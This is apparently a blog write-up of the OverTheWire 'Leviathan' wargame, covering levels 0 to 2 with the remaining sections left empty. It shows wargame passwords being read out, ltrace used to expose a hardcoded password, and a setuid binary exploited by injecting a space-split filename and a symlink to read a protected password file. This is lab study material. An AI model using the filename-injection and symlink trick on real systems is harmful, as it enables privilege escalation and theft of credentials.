---
layout: single
title: "OverTheWire: 'Leviathan' Solutions 1-8"
header:
  teaser: oth.png
  overlay_image: ZenBG.png
  caption: "[__OverTheWire__](http://overthewire.org/wargames/)"
related: true
comments: true
---

__Leviathan__: The leviathan is a large aquatic creature of some kind. The Bible refers to it as a fearsome beast having monstrous ferocity and great power. This word has become synonymous with any large sea monster or creature. In literature it refers to great whales, and in Modern Hebrew, it simply means "whale". And trust me... you will have a "whale" of a time with this one! Eh? EH? No? -- Fine, I'll see my way out...

Anyways, (hah "whale of a time"... I think I'm funny) ... anyways, Leviathan is a wargame that was rescued from the demise of intruded.net, previously hosted on __leviathan.intruded.net__. It can now be found [HERE](http://overthewire.org/wargames/leviathan/) at OverTheWire. The wargame consists of 8 levels and is classified as 1/10 difficulty. It also states that "This wargame doesn't require any knowledge about programming - just a bit of common sense and some knowledge about basic *nix commands."

Though in all honesty, it requires a bit more then what they are stating. Before we begin, for anyone going through the levels and having a hard time, all I can say is focus on the output of code and utilize the [ltrace](http://linux.die.net/man/1/ltrace) command.

So, let's begin... shall we?


### Level 0:
For the first level we must log into leviathan, so we will SSH to leviathan0 with the username: __leviathan0__ and password: __leviathan0__

```console
root@kali:~# ssh leviathan0@leviathan.labs.overthewire.org
```

OverTheWire provides us only with one hint "Data for the levels can be found in the __homedirectories__." So we are on our own!

Let's go ahead and find out what we have in our home directory.

```console
leviathan0@melinda:~$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile
```

__.backup__ looks promising, so let's look in there and see if we can't find anything.

```console
leviathan0@melinda:~$ cd .backup
leviathan0@melinda:~/.backup$ ls -a
.  ..  bookmarks.html
leviathan0@melinda:~/.backup$ grep leviathan1 bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

### Level 0 -> 1:
This level was fairly easy, and you can use a plethora of methods to find the password for this. First let's see what we have to work with.

```console
leviathan1@melinda:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  check
```

We can see that the home directory stores an executable called __check__, so let's run that and see what happens. 

```console
leviathan1@melissa:~$ ./check
password: love
Wrong password, Good Bye ...
```
Hmm... Okay, so it seems that the executable is checking for a password. That means that it's comparing it to something hardcoded. Let's run an `ltrace` and see what the library calls are for this program.

```console
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
printf("password: ")                             = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: 
)     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)     = 10
strcmp("\n\n\n", "sex")                          = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)             = 29
+++ exited (status 0) +++
```

Looking at the output of the code we can see that the program is using `strcmp` which is a C library function to compare two strings against the word "sex"... let's see if "sex" will work.

```console
leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

And there we have the password! Now, if you think this was hard... it get's harder, so strap in as we move to level 2!


### Level 1 -> 2:
This level is really interesting in my honest opinion, as it allows you to exploit a flaw in the executable. It took me a while and a lot of [Google Fu](https://en.wiktionary.org/wiki/Google-fu) (yes, it's a thing) to finally figure out how the get the password from __/etc/leviathan_pass/leviathan3__.

```console
leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

Alright, so it seems the program __printfile__ outputs the text from a file, just like `cat`, so we can assume that it's using cat somewhere in the code... but hold on a second. I like working smart, and not hard. Let's see if we can get the __leviathan3__ password file from __/etc/leviathan_pass/__

```console
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Darn... guess not. That's okay, let's go ahead and make a temp directory and a new text file for testing the program with `ltrace`.

```console
leviathan2@melinda:~$ mkdir /tmp/jhalon && touch /tmp/jhalon/test.txt
leviathan2@melinda:~$ cd /tmp/jhalon
leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile test.txt
__libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
access("test.txt", 4)                            = 0
snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
system("/bin/cat test.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

So, what is happening here is a small security hole in how this program functions. We can see that the function `access()` and __/bin/cat__ are being called on the file. What `access()` does is check permissions based on the process’ real user ID rather than the effective user ID.

So, the real user id is who you really are (the one who owns the process), and the effective user id is what the operating system looks at to make a decision whether or not you are allowed to do something (most of the time, there are some exceptions).

Looking into the code we also see that __/bin/cat__ is being called on the file to output the contents. While `access()` uses the full path's filename, __/bin/cat__ uses %s then the filename. What we can do here is try to add a space to a filename, and if we are correct, __/bin/cat__ will read the file as 2 separate files.

```console
leviathan2@melinda:/tmp/jhalon$touch pass\ file.txt
leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile "pass file.txt"
__libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
access("pass file.txt", 4)                       = 0
snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
```

I was right! You can see __/bin/cat__ call __pass file.txt__ as two separate files __pass__ and __file.txt__. We can actually exploit this! Let’s go ahead and create a [symbolic link](https://en.wikipedia.org/wiki/Symbolic_link) for __pass file.txt__ and link it to __/etc/leviathan_pass/leviathan3__.

```cosnole
leviathan2@melinda:/tmp/jhalon$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalon/pass
leviathan2@melinda:/tmp/jhalon$ ls -la
total 7864
drwxrwxr-x 2 leviathan2 leviathan2    4096 Sep 10 04:55 .
drwxrwx-wt 1 root       root       8036352 Sep 10 04:55 ..
lrwxrwxrwx 1 leviathan2 leviathan2      30 Sep 10 04:55 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2       0 Sep 10 04:54 pass file.txt
leviathan2@melinda:/tmp/jhalon$ ~/printfile "pass file.txt"
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
```

And bingo was his name, OH! We got the password for level 3! Go do a victory lap around the house, you deserved it!

### Level 2 -> 3:

```console

```

### Level 3 -> 4:

```console

```

### Level 4 -> 5:

```console

```

### Level 5 -> 6:

```console

```

### Level 6 -> 7:

```console

```
